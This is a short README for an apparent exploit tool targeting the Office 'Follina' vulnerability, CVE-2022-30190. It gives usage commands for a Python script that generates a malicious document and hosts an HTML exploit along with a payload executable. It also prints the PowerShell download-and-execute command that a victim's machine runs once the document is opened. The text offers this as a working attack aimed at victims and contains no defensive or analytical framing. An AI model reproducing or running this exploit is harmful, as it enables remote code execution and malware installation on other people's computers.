## CVE-2022-30190
### Instructions to run the exploit
Run:
```
python3 follina.py
```
This will run a server with an endpoint to serve the index.html. The HTML contains the exploit. This script also generates the malicious document that will call the endpoint.

The server is also used to serve a payload that can be specified with:
```
python3 follina.py -pl payload.exe
```
By default it is payload.exe, and obviously the payload.exe must exist and be an executable that can be executed in the victims machine.

### Attack vector
Once a victim opens the maldoc he will execute:
```
Invoke-WebRequest http://{serve_host}:8000/{args.payload} -OutFile C:\\Windows\\Tasks\\{args.payload}; C:\\Windows\\Tasks\\{args.payload}
```
This downloads the prepared payload and executes it in the victims machine.

You will need a Windows machine with a vulnerable version of Office, tested on Office 2021 offline iso download.